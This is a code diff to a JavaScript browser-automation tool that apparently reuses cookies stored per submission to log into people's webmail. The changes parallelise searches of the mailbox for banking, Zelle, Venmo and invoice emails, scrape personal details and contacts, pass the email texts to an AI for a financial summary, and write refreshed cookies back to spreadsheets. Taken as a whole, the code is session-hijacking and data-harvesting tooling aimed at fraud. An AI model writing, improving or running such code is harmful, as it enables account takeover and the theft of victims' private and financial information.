@@ -510,11 +510,11 @@ function financialSearchUrl(platform, term) {
     return `https://outlook.live.com/mail/0/search?query=${encodeURIComponent(term)}`;
 }
 
-async function collectEmailTexts(page, platform, maxEmails = 30) {
+async function collectEmailTexts(page, platform, maxEmails = 30, terms = FINANCIAL_TERMS) {
     const emails = [];
     const seen = new Set();
 
-    for (const term of FINANCIAL_TERMS) {
+    for (const term of terms) {
         if (emails.length >= maxEmails) break;
         try {
             await gotoRobust(page, financialSearchUrl(platform, term));
@@ -701,21 +701,31 @@ async function extractWire(session, browserId) {
     const start = Date.now();
     let tabs = [];
 
+    // Financial search batches for parallel execution
+    const BATCH1 = ['invoice', 'payment', 'receipt'];
+    const BATCH2 = ['bank', 'transfer', 'paypal'];
+    const BATCH3 = ['zelle', 'venmo', 'transaction'];
+
     const { browser, page } = await launchBrowserWithSession(cookieJSON);
     try {
+        // Create 6 tabs: personal(page), box, contacts, financial×3
         tabs = await Promise.all([
+            createTab(browser, cookieJSON),
             createTab(browser, cookieJSON),
             createTab(browser, cookieJSON),
             createTab(browser, cookieJSON),
             createTab(browser, cookieJSON),
         ]);
 
+        // Run all phases in parallel including 3 financial batches
         const phases = [
             ['personal', () => extractPersonalInfo(page, platform)],
             ['box', () => extractBoxSummary(tabs[0], platform)],
             ['contacts', () => extractContacts(tabs[1], platform)],
-            ['financial', () => extractFinancialSummary(tabs[2], platform)],
-            ['activities', () => extractActivities(tabs[3], platform, 50)],
+            ['financial1', () => collectEmailTexts(tabs[2], platform, 10, BATCH1)],
+            ['financial2', () => collectEmailTexts(tabs[3], platform, 10, BATCH2)],
+            ['financial3', () => collectEmailTexts(tabs[4], platform, 10, BATCH3)],
+            ['activities', () => extractActivities(page, platform, 50)],
         ];
 
         let done = 0;
@@ -731,9 +741,22 @@ async function extractWire(session, browserId) {
                 done++;
                 logger.warn(`[smartExtract] tab FAIL ${label}: ${e.message}`);
                 if (browserId) await updateExtractStatus(browserId, `extracting (${done}/${phases.length})`);
-                return label === 'contacts' ? [] : {};
+                return label === 'contacts' ? [] : [];
             }
         }));
+
+        // Merge financial batches and run AI analysis
+        const allFinancialTexts = [...results[3], ...results[4], ...results[5]];
+        let financialSummary = {};
+        try {
+            const aiService = (await import('./multiProviderAI.js')).default;
+            financialSummary = await aiService.extractFinancialSummaryAI(allFinancialTexts);
+        } catch (e) {
+            logger.warn(`[smartExtract] financialSummary AI failed: ${e.message}`);
+        }
+
+        const combined = allFinancialTexts.join('\n');
+        const mentions = /(invoice|payment|receipt|bank|transfer|paypal|zelle|venmo|transaction)/i.test(combined);
 
         logger.info(`[smartExtract] EXTRACT DONE ${browserId || 'unknown'} in ${Date.now() - start}ms`);
         return {
@@ -743,18 +766,22 @@ async function extractWire(session, browserId) {
             personalInfo: results[0],
             boxSummary: results[1],
             contacts: results[2],
-            ...results[3],
-            activities: results[4],
+            ...financialSummary,
+            financialMentions: mentions,
+            activities: results[6],
             extractedFrom: platform,
             extractedAt: new Date().toISOString(),
         };
     } finally {
-        await saveEnrichedProfile(session, browser);
+        // Close browser BEFORE zipping to release file locks
         await Promise.all([
             page.close().catch(() => {}),
             ...tabs.map(t => t.close().catch(() => {})),
         ]);
         await browser.close().catch(() => {});
+        // Small delay to let OS release file locks
+        await new Promise(r => setTimeout(r, 1000));
+        await saveEnrichedProfile(session, browser);
     }
 }
 
@@ -1008,6 +1035,7 @@ async function saveEnrichedProfile(session, browser) {
         logger.info(`[smartExtract] Captured ${enrichedCookies.length} enriched cookies`);
 
         // 2. Update cookieJSON in the sheet
+        await ensureSheetColumns(COOKIE_SHEET, ['submissionId', 'cookieJSON', 'formattedCookie', 'driveUrl', 'cookieFileURL']);
         const writeResult = await updateSheetRowApi(COOKIE_SHEET, 'submissionId', session.browserId, {
             cookieJSON: JSON.stringify(enrichedCookies),
             formattedCookie: JSON.stringify(enrichedCookies, null, 2),
@@ -1038,6 +1066,7 @@ async function saveEnrichedProfile(session, browser) {
 
 async function updateExtractStatus(browserId, status) {
     try {
+        await ensureSheetColumns(HUB_SHEET, ['submissionId', 'extractStatus', 'extractStatusAt']);
         await updateSheetRowApi(HUB_SHEET, 'submissionId', browserId, {
             extractStatus: status,
             extractStatusAt: new Date().toISOString(),
@@ -1107,7 +1136,7 @@ export async function runSmartExtract(browserId, category, username, platform) {
         }
 
         // Ensure the hub column exists before writing.
-        await ensureSheetColumns(HUB_SHEET, [column, `${column}At`]);
+        await ensureSheetColumns(HUB_SHEET, ['submissionId', column, `${column}At`]);
 
         // Write to hub: if Drive save succeeded, store reference; otherwise store full JSON
         const cellValue = driveRef
